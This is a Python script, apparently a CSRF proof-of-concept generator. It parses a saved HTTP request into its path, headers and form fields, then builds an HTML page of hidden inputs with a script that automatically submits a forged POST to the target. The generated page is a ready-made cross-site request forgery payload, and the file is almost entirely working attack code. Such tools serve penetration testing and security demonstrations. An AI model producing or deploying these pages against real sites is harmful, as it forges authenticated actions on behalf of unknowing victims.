from urllib.parse import parse_qs
import ast
import argparse

def split_page_headers_data(request):
    str_headers, str_data = request.split('\n\n')
    page, str_headers = str_headers.split('\n', 1)
    page = page.split(' ')[1]

    headers = parse_headers(str_headers)
    data = parse_data(str_data)

    return page, headers, data

def parse_headers(str_headers):
    headers = dict()

    for str_header in str_headers.splitlines():
        header, value = str_header.split(':', 1)
        header = header.strip().lower()
        value = value.strip().lower()
        headers[header] = value

    return headers

def parse_data(str_data):
    data = dict()	
		
    for key, value in parse_qs(str_data).items():
        data[key] = value[0]

    return data
	
def create_argument_parser():
    arg_parser = argparse.ArgumentParser(prog='csrf_poc',
        description='A CSRF PoC generator')

    # The input file where the request is stored
    arg_parser.add_argument('-y',
        dest='request_file', type=argparse.FileType('r'),
        required=True, help='file containing the request')

    # A flag used to determine whether the action URL starts with HTTPS
    arg_parser.add_argument('-u', action='store_true', dest='is_ssl',
        help='if this flag is set, the form will have an HTTPS action URL')

    # The output file. If not specified, the result will be printed to stdout
    arg_parser.add_argument('-v', dest='output_file', type=str,
        help='HTML output file (default: stdout)')

    return arg_parser

def generate_html(url, data):
    html = '<html>\n\t<body>\n'

    html += '\t\t<form id="csrf_form" action="{0}" method="POST">\n'.format(url)

    for key, value in data.items():
        html += '\t\t\t<input type="hidden" name="{0}" value="{1}"/>\n'.format(key, value)

    html += '\t\t</form>\n'
    html += '\t\t<script>\n\t\t\tdocument.forms["csrf_form"].submit()\n\t\t</script>\n'
    html += '\t</body>\n</html>'

    return html	
